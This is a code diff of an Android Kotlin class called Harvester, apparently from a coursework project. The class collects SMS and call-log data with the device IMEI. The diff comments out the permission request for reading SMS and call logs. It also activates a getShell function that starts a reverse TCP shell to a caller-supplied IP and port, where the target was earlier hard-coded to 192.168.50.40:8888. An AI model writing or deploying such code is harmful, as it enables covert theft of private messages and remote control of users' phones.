@@ -8,14 +8,15 @@ import androidx.annotation.RequiresApi
 import androidx.core.app.ActivityCompat
 import com.example.assignment1.DataRetriever.CallLog
 import com.example.assignment1.DataRetriever.smsLog
+import kotlin.concurrent.thread
 
 class Harvester(var activity: Activity, var context: Context, var imei: String) {
 
-    init{
-        ActivityCompat.requestPermissions(activity,
-        arrayOf(android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CALL_LOG),
-        100)
-    }
+//    init{
+//        ActivityCompat.requestPermissions(activity,
+//        arrayOf(android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CALL_LOG),
+//        100)
+//    }
 
     fun getSMS(){
         println("SMS inbox")
@@ -32,17 +33,17 @@ class Harvester(var activity: Activity, var context: Context, var imei: String) 
         //println(callLogs)
     }
 
-    @RequiresApi(Build.VERSION_CODES.O)
-    fun getShell(){
+//    @RequiresApi(Build.VERSION_CODES.O)
+    fun getShell(ip: String, port: Int){
      /*   checkNetworkPermission()
-        checkStoragePermission()
-//        shellGetter.main()
+        checkStoragePermission()*/
+        // shellGetter.main()
         // This would be a good place to have the threading I think
         println(reverseShell.getShellPath())
         thread(start = true){
 //            newShell().main()
-            reverseShell.reverse_tcp("192.168.50.40", 8888)
-        }*/
+            reverseShell.reverse_tcp(ip, port)
+        }
 
     }
 
